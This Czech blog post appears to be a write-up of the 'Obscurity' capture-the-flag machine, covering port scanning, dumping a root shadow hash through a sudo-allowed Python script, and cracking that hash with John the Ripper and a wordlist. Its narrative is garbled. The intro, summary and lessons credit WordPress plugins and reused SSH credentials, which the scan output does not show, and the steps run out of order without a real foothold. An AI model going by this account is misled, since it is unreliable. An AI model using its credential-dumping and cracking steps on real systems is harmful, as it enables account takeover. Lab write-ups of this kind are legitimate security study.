---
layout: post
author: Tomáš Matějíček
title: "Obscurity"
date: 2020-12-22
tags: linux rce ssh sudo wordpress exploit
---
## Úvod a kontext

Obscurity stojí na řetězení několika konkrétních slabin a artefaktů: WordPress a jeho pluginy a SSH.

Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká SSH s nalezenými přihlašovacími údaji a teprve na něj navazuje příliš široká `sudo` oprávnění.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```
PORT     STATE  SERVICE    VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sat, 30 Nov 2019 20:51:25
|     Server: BadHTTPServer
|     Last-Modified: Sat, 30 Nov 2019 20:51:25
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
[... výstup zkrácen ...]
SF:ent=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\n
SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
SF:ofile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styles
SF:heet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"styleshee
SF:t\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\
SF:"scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x2
SF:0section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"
SF:sk-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
```
root:$6$riekpK4m$__CENSORED__:18226:0:99999:7

/usr/sbin/john Obscurity-shadow --wordlist=/usr/share/wordlists/rockyou.txt
=>mercedes         (root)

su root
```

## Získání přístupu

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
ssh robert@obscurity.htb
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__

=>sudo -l => (ALL) NOPASSWD: __CENSORED__ /home/robert/BetterSSH/BetterSSH.py
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako WordPress a jeho pluginy a SSH.
- User část stála na ověřeném kroku typu SSH s nalezenými přihlašovacími údaji, ne na odhadu bez technického potvrzení.
- Závěrečná eskalace pak stála na tom, co představuje příliš široká `sudo` oprávnění, takže rozhodující byla práce s lokálním kontextem po footholdu.

## Co si odnést do praxe

- V tomhle článku se první slabé místo otevřelo přes WordPress a jeho pluginy a SSH. WordPress a jeho pluginy potřebují tvrdé oddělení administrace, minimální sadu rozšíření a rychlé patchování; právě pluginy často tvoří první vstup.
- Stabilní foothold pak stojí na principu SSH s nalezenými přihlašovacími údaji. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
- Pro závěrečnou fázi je podstatné, že rozhodla příliš široká `sudo` oprávnění. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
